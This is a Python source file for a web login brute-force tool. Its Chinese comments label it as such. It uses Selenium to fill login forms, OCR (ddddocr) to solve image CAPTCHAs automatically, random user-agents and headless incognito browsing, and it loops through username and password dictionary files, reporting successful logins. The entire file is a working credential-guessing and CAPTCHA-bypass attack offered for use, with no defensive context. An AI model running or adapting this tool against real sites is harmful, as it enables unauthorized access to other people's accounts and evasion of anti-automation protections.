# -*- coding: utf-8 -*-
import ddddocr
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from random import randint
from colorama import init
import optparse
import time
import json


def login(driver, ocr, conf, username ,password):
    ########################
    ##### 登录爆破功能 #####
    ########################
    
    driver.get(conf["url"])
    orc_img = driver.find_element(By.XPATH, conf["orc_xpath"])
    res = orc_identify(orc_img, ocr)
    regex_verify_res = conf["regex_verify_res"]
    regex_login_fail_res = conf["regex_login_fail_res"]
    driver.find_element(By.XPATH, conf["user_xpath"]).send_keys(username)
    driver.find_element(By.XPATH, conf["pass_xpath"]).send_keys(password)
    driver.find_element(By.XPATH, conf["orc_input_xpath"]).send_keys(res)
    driver.find_element(By.XPATH, conf["login_button_xpath"]).click()
    time.sleep(0.5)
    try:
        if alert_js(driver):
            html = alert_js(driver)
            driver.switch_to.alert.accept()
        else:
            html = driver.page_source
        if regex_verify_res in html:
            print("\033[0;31;40m[-]Verification code error : " + username + "/" + password + "\033[0m")
        elif regex_login_fail_res in html:
            print("\033[0;31;40m[-]login fail : " + username + "/" + password + "\033[0m")
        else:
            print("\033[1;32m[+]login success : " + username + "/" + password + "\033[0m")
        return 0
    except:
        print("\033[0;31;40m[-]Error!!! \033[0m")
        return 0
    
    
def orc_identify(orc_img, ocr):
    ####################
    ##### ocr 识别 #####
    ####################
    orc_img.screenshot('./image.png')
    with open('image.png', 'rb') as f:
        img_bytes = f.read()
    res = ocr.classification(img_bytes)
    return res
    
    
def alert_js(driver):
    ########################
    ##### 弹框文本处理 #####
    ########################
    try:
        alert = driver.switch_to.alert
        res = alert.text
        return res
    except:
        return False
    
def browser(m):
    ########################
    ##### 头浏览器设置 #####
    ########################
    s = Service("D:/python3/chromedriver.exe")
    chrome_ot = Options()
    if m:
        chrome_ot.add_argument("--headless")  
    chrome_ot.add_argument("--incognito")
    chrome_ot.add_argument('--user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/{} Safari/{}"'.format(randint(100,900),randint(200,300)))
    chrome_ot.add_argument("--disable-infobars")
    chrome_ot.add_argument("--disable-gpu")
    chrome_ot.add_argument("--ignore-certificate-errors")
    chrome_ot.add_experimental_option('excludeSwitches', ['enable-logging','DeprecationWarning'])
    browser = webdriver.Chrome(service=s,options=chrome_ot)
    #browser.maximize_window() # 浏览器自动全屏
    browser.set_page_load_timeout(15)
    browser.implicitly_wait(15)
    return browser
    
    
def file_read(file):
    ####################
    ##### 文件读取 #####
    ####################
    f = open(file,"r")
    lists = f.readlines()
    f.close()
    return lists
    
    
def run(user_list, pass_list, config_file, driver, ocr):
    ####################
    ##### 开始爆破 #####
    ####################
    print("\033[7;36m[*]running...\033[0m")
    conf = json.load(open(config_file,'r',encoding='utf-8'))
    for user_line in user_list:
        user_line = user_line.strip("\n")
        for pass_line in pass_list:
            pass_line = pass_line.strip("\n")
            login(driver, ocr, conf, user_line , pass_line)
    print("\033[7;36m[*]all done!\033[0m")
    return 0
    
def main():
    ####################
    ##### 全局配置 #####
    ####################
    init(autoreset=True)
    parser = optparse.OptionParser('usage %prog -u <username dict> -p <password dict> -c <config file>')
    parser.add_option('-u' , dest = 'username_dict', action = 'store', type = 'string' , help = 'Enter the username dict eg:user.txt')
    parser.add_option('-p' , dest = 'password_dict', action = 'store', type = 'string' , help = 'Enter the password dict eg:pass.txt')
    parser.add_option('-c' , dest = 'config_file', action = 'store', type = 'string' , help = 'Enter the config file eg:conf.json')
    parser.add_option('-e' , dest = 'model_setting', action = 'store_true' , default = False, help = 'Use headless model eg: -e ')
    (options, args) = parser.parse_args()
    config_file = options.config_file
    username_dict = options.username_dict
    password_dict = options.password_dict
    model = options.model_setting
    driver = browser(model)
    ocr = ddddocr.DdddOcr()
    user_list = file_read(username_dict)
    pass_list = file_read(password_dict)
    run(user_list, pass_list, config_file, driver, ocr)
    time.sleep(1)
    driver.quit()
    
    
if __name__ == "__main__":
    main()
